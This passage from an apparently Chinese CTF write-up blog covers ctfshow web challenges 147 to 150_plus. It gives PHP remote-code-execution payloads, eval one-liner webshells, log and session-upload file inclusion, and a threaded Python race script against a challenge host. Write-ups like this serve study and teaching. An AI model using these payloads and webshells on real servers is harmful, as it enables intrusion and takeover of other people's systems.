而如果是\function_name()这样的形式去调用函数，则是表示写了一个绝对路径即去\这个空间调用。 如果你在其他namespace里调用系统类，必须使用绝对路径的写法<br>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET：?show=<span class="keyword">echo</span> <span class="number">123</span>;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//</span></span><br><span class="line">POST：ctf=\create_function</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">结果就是：</span><br><span class="line"><span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">=&gt;</span><br><span class="line">\<span class="title function_ invoke__">creat_function</span>(<span class="string">&#x27;&#x27;</span>,<span class="string">&#x27;echo 123;&#125;system(&#x27;</span>tac f*<span class="string">&#x27;);//&#x27;</span>);</span><br><span class="line">=&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;&#125;<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//;&#125;</span></span><br><span class="line">=&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="number">123</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);<span class="comment">//;&#125;</span></span><br></pre></td></tr></table></figure><h1 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h1><h3 id="考点：无字母RCE-中文一句话木马-中文编码异或"><a href="#考点：无字母RCE-中文一句话木马-中文编码异或" class="headerlink" title="考点：无字母RCE 中文一句话木马 中文编码异或"></a>考点：无字母RCE 中文一句话木马 中文编码异或</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没过滤^ 直接异或：<br>payload：<code>?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</code><br>看了hint里面还有一种解法，使用中文编码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$哈=<span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br></pre></td></tr></table></figure><p>其中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="string">&quot;?&lt;&gt;/&quot;</span>异或出来的结果是 _GET</span><br><span class="line">  </span><br><span class="line">?code=$哈=_GET;<span class="variable">$_GET</span>[哼](<span class="variable">$_GET</span>[嗯]); </span><br><span class="line">=》?code=<span class="title function_ invoke__">system</span>(tac f*);</span><br></pre></td></tr></table></figure><h1 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h1><h3 id="考点：条件竞争"><a href="#考点：条件竞争" class="headerlink" title="考点：条件竞争"></a>考点：条件竞争</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">is_file--判断给定文件名是否为一个正常的文件</span><br><span class="line">unlink--删除文件</span><br></pre></td></tr></table></figure><p>非预期：往index.php里面写一句话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?ctf=index.php</span><br><span class="line">POST:show=<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>然后访问url/index.php;POST传参1=system(‘tac /ctfshow_fl0g_here.txt’);<br>预期：条件竞争：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ctf=<span class="number">1</span>.php</span><br><span class="line">show=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac /c*&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>使用bp不断访问并传参，然后再开一个去不断访问 1.php</p><h1 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h1><h3 id="考点：日志包含-session包含"><a href="#考点：日志包含-session包含" class="headerlink" title="考点：日志包含 session包含"></a>考点：日志包含 session包含</h3><blockquote><p><a href="http://c.biancheng.net/view/7272.html">http://c.biancheng.net/view/7272.html</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class_exists--检查类是否已定义</span><br><span class="line"></span><br><span class="line">比较运算符优先级大于逻辑运算符（==在&amp;&amp;前）</span><br><span class="line"></span><br><span class="line">值得注意的是，这里使用的是GET和POST，所以传入进去的都是字符串</span><br></pre></td></tr></table></figure><h2 id="方法一-日志包含"><a href="#方法一-日志包含" class="headerlink" title="方法一 日志包含"></a>方法一 日志包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ctf</span>=<span class="string">&#x27;/var/log/nginx/access.log&#x27;</span>;</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="string">&#x27;false&#x27;</span>&amp;&amp;<span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>);<span class="comment">//true</span></span><br><span class="line"> </span><br><span class="line">而</span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="literal">false</span> &amp;&amp;<span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>);<span class="comment">//false</span></span><br></pre></td></tr></table></figure><p>这里要想包含需要$isVIP变量为true且传入的ctf中没有:  即可，这里有QUERY_STRING和extra<br>修改UA为:<?php eval($_POST[1]);?>执行<br>然后传参再次执行（执行两次）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:?isVIP=<span class="literal">true</span></span><br><span class="line">POST:ctf=/<span class="keyword">var</span>/log/nginx/access.log&amp;<span class="number">1</span>=<span class="title function_ invoke__">system</span>(<span class="string">&#x27;tac f*&#x27;</span>);</span><br></pre></td></tr></table></figure><p>（当然也可以用session文件包含）</p><h2 id="方法二-session包含"><a href="#方法二-session包含" class="headerlink" title="方法二 session包含"></a>方法二 session包含</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Time : 20.12.5 13:52</span></span><br><span class="line"><span class="comment"># @author:lonmar</span></span><br><span class="line">import io</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"></span><br><span class="line">sessid = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&quot;ctf&quot;</span>: <span class="string">&quot;/tmp/sess_test&quot;</span>,</span><br><span class="line">    <span class="string">&quot;cmd&quot;</span>: <span class="string">&#x27;system(&quot;cat flag.php&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">write</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        f = io.<span class="title function_ invoke__">BytesIO</span>(b<span class="string">&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">        resp = session.<span class="title function_ invoke__">post</span>(<span class="string">&#x27;http://ebef7177-6610-492f-9231-b5a52f89b2cf.challenge.ctf.show/&#x27;</span>,</span><br><span class="line">                            data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;,</span><br><span class="line">                            files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;test.txt&#x27;</span>, f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def <span class="title function_ invoke__">read</span>(session):</span><br><span class="line">    <span class="keyword">while</span> event.<span class="title function_ invoke__">isSet</span>():</span><br><span class="line">        res = session.<span class="title function_ invoke__">post</span>(</span><br><span class="line">            <span class="string">&#x27;http://ebef7177-6610-492f-9231-b5a52f89b2cf.challenge.ctf.show/?isVIP=1&#x27;</span>,</span><br><span class="line">            data=data</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;ctfshow&#123;&#x27;</span> in res.text:</span><br><span class="line">            <span class="keyword">print</span>(res.text)</span><br><span class="line">            event.<span class="title function_ invoke__">clear</span>()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">print</span>(<span class="string">&#x27;[*]retrying...&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event = threading.<span class="title function_ invoke__">Event</span>()</span><br><span class="line">    event.<span class="title function_ invoke__">set</span>()</span><br><span class="line">    with requests.<span class="title function_ invoke__">session</span>() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=write, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="number">1</span>, <span class="number">5</span>):</span><br><span class="line">            threading.<span class="title function_ invoke__">Thread</span>(target=read, args=(session,)).<span class="title function_ invoke__">start</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id=""><a href="#" class="headerlink" title=""></a><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1688360201342-f4914c95-2d3d-4797-b5a1-774fc3b709fc.png" alt="image.png"></h1><h1 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修复web150的非预期解日志包含，但还可以使用session包含<br>预期解：<br><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/README.zh-cn.md">vulhub/README.zh-cn.md at master · vulhub/vulhub · GitHub</a><br><a href="https://github.com/vulhub/vulhub/blob/master/php/inclusion/exp.py">vulhub/exp.py at master · vulhub/vulhub · GitHub</a><br>这个题一点点小坑__autoload()函数不是CTFSHOW类里面的<br>__autoload — 尝试加载未定义的类（本函数已自 PHP 7.2.0 起被废弃，并自 PHP 8.0.0 起被移除）<br>当我们使用class_exists对类进行判断的时候就会自动调用__autoload()函数<br>只要我们能够控制$__CTFSHOW__，那么就能控制$class,那么就能控制$class()函数了。<br>有QUERY_STRING和extract函数，所以我们能够覆盖$__CTFSHOW__这个变量。同时因为过滤了下划线_，但是php在处理点号时会自动将其作为下划线处理。所以我们构造payload为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET：?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure><p>原因是..CTFSHOW..解析变量成__CTFSHOW__然后进行了变量覆盖，然后对其进行类判断，就会自动调用 __autoload()函数方法，因为$<strong>CTFSHOW</strong>=phpinfo；那么就会去加载phpinfo=<br>然后在页面中搜索环境变量flag即可。<br>session包含还可以用</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web151-web170文件上传篇</title>
      <link href="/2023/07/09/web151-web170%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/"/>
      <url>/2023/07/09/web151-web170%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="web151、web152"><a href="#web151、web152" class="headerlink" title="web151、web152"></a>web151、web152</h1><h3 id="前端校验"><a href="#前端校验" class="headerlink" title="前端校验"></a>前端校验</h3><p>根据提示，检验写在了前端。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">layui.<span class="keyword">use</span>(<span class="string">&#x27;upload&#x27;</span>, <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> upload = layui.upload;</span><br><span class="line">   </span><br><span class="line">  <span class="comment">//执行实例</span></span><br><span class="line">  <span class="keyword">var</span> uploadInst = upload.<span class="title function_ invoke__">render</span>(&#123;</span><br><span class="line">    <span class="attr">elem</span>: <span class="string">&#x27;#upload&#x27;</span> //绑定元素</span><br><span class="line">    ,<span class="attr">url</span>: <span class="string">&#x27;/upload/&#x27;</span> //上传接口</span><br><span class="line">    ,<span class="attr">done</span>: function(res)&#123;</span><br><span class="line">    <span class="keyword">if</span>(res.code==<span class="number">0</span>)&#123;</span><br><span class="line">    $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;文件上传成功，路径：&quot;</span>+res.msg);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    $(<span class="string">&quot;#result&quot;</span>).<span class="title function_ invoke__">html</span>(<span class="string">&quot;文件上传失败，失败原因：&quot;</span>+res.msg);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    &#125;</span><br><span class="line">    ,error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">      $(<span 